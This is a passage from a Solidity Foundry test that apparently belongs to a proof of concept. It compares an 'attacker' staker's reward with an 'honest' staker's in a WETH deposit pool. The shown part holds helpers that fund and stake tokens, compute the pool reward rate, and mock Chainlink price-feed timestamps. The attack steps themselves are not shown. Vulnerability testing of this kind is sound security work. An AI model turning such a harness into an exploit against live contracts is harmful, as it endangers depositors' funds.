        result.attackerReward = WETH_POOL.getLatestUserReward(POOL_ID, attacker);
        result.honestReward = WETH_POOL.getLatestUserReward(POOL_ID, honest);
    }

    function _stake(address user, uint256 amount) private {
        _stakeToken(user, WETH, WETH_POOL, amount);
    }

    function _stakeToken(
        address user,
        IERC20Checkpoint token,
        IDepositPoolCheckpoint pool,
        uint256 amount
    ) private {
        _stakeTokenWithOptions(user, token, pool, amount, 0, address(0));
    }

    function _stakeTokenWithOptions(
        address user,
        IERC20Checkpoint token,
        IDepositPoolCheckpoint pool,
        uint256 amount,
        uint128 claimLockEnd,
        address referrer
    ) private {
        deal(address(token), user, amount);
        vm.startPrank(user);
        (bool approved, bytes memory approvalData) = address(token).call(
            abi.encodeWithSignature("approve(address,uint256)", pool.distributor(), amount)
        );
        require(approved && (approvalData.length == 0 || abi.decode(approvalData, (bool))), "token approval failed");
        pool.stake(POOL_ID, amount, claimLockEnd, referrer);
        vm.stopPrank();
    }

    function _currentPoolRate(IDistributorCheckpoint distributor) private view returns (uint256) {
        return _currentPoolRateFor(WETH_POOL, distributor);
    }

    function _currentPoolRateFor(
        IDepositPoolCheckpoint pool,
        IDistributorCheckpoint distributor
    ) private view returns (uint256) {
        (, uint256 storedRate, uint256 totalVirtual) = pool.rewardPoolsData(POOL_ID);
        (,,,, uint256 accountedRewards) = pool.rewardPoolsProtocolDetails(POOL_ID);
        uint256 newlyDistributed = distributor.getDistributedRewards(POOL_ID, address(pool)) - accountedRewards;
        if (totalVirtual == 0) return storedRate;
        return storedRate + (newlyDistributed * RATE_PRECISION) / totalVirtual;
    }

    function _refreshChainlinkTimestamps(IDistributorCheckpoint distributor) private {
        address clConsumer = distributor.chainLinkDataConsumer();

        for (uint256 i = 0; ; i++) {
            address poolAddr;
            try distributor.depositPoolAddresses(POOL_ID, i) returns (address a) {
                poolAddr = a;
            } catch {
                break;
            }

            (, string memory path,,,,,,) = distributor.depositPools(POOL_ID, poolAddr);
            bytes32 pathId = keccak256(bytes(path));

            for (uint256 k = 0; ; k++) {
                (bool okFeed, bytes memory feedResult) = clConsumer.staticcall(
                    abi.encodeWithSignature("dataFeeds(bytes32,uint256)", pathId, k)
                );
                if (!okFeed || feedResult.length < 32) break;

                address feed = abi.decode(feedResult, (address));
                if (feed == address(0)) break;

                (bool okRound, bytes memory roundResult) = feed.staticcall(
                    abi.encodeWithSignature("latestRoundData()")
                );
                require(okRound && roundResult.length >= 160, "feed read failed");

                (uint80 roundId, int256 answer,,, uint80 answeredInRound) =
                    abi.decode(roundResult, (uint80, int256, uint256, uint256, uint80));
                require(answer > 0, "invalid real feed answer");

                vm.mockCall(
                    feed,
                    abi.encodeWithSignature("latestRoundData()"),
                    abi.encode(roundId, answer, block.timestamp, block.timestamp, answeredInRound)
                );
            }
        }
    }
}
